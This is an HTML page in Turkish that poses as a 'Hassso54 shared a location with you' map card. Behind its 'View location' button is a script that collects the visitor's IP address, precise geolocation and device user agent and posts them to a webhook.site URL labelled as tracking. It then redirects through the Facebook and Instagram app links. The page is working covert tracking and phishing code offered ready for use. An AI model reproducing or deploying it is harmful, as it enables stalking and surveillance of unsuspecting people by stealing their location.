<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .kart {
            background: white;
            border-radius: 30px;
            padding: 35px 25px;
            text-align: center;
            max-width: 320px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .map-image {
            width: 160px;
            height: 160px;
            object-fit: contain;
            margin-bottom: 15px;
        }
        h2 {
            font-size: 20px;
            color: #202124;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .alt-yazi {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 25px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 14px 25px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: 0.2s;
        }
        button:active {
            transform: scale(0.97);
        }
        button:disabled {
            background: #ccc;
        }
    </style>
</head>
<body>
    <div class="kart">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-image">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="alt-yazi">Sakarya bölgesindeki konuma bak</div>
        <button id="btn">Konumu Görüntüle</button>
    </div>

    <script>
        const webhook = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
        
        async function gonder(veri) {
            await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(veri) });
        }
        
        async function islem() {
            const btn = document.getElementById('btn');
            btn.innerText = "⏳";
            btn.disabled = true;
            
            let ip = "Bilinmiyor";
            let konumLink = "";
            let enlem = "", boylam = "";
            
            // IP al
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const json = await res.json();
                ip = json.ip;
            } catch(e) {}
            
            // Konum al
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    enlem = pos.coords.latitude;
                    boylam = pos.coords.longitude;
                    konumLink = `https://www.google.com/maps?q=${enlem},${boylam}`;
                    
                    // Önce bilgileri gönder (şimdilik)
                    await gonder({
                        tip: "Hassso54_Takip",
                        zaman: new Date().toLocaleString('tr-TR'),
                        ip: ip,
                        enlem: enlem,
                        boylam: boylam,
                        konum: konumLink,
                        cihaz: navigator.userAgent
                    });
                    
                    // Facebook ve Instagram uygulamalarını arka planda aç/kapat
                    // Önce Facebook'u aç
                    window.location.href = "fb://profile";
                    
                    // 0.5 saniye sonra Instagram'ı aç
                    setTimeout(() => {
                        window.location.href = "instagram://user?username=";
                    }, 500);
                    
                    // 1 saniye sonra haritayı aç
                    setTimeout(() => {
                        window.location.href = konumLink;
                    }, 1200);
                    
                }, async () => {
                    await gonder({ tip: "Hata", ip: ip, hata: "Konum izni yok" });
                    window.location.href = "https://www.google.com/maps";
                });
            } else {
                window.location.href = "https://www.google.com/maps";
            }
        }
        
        document.getElementById('btn').onclick = islem;
    </script>
</body>
</html>
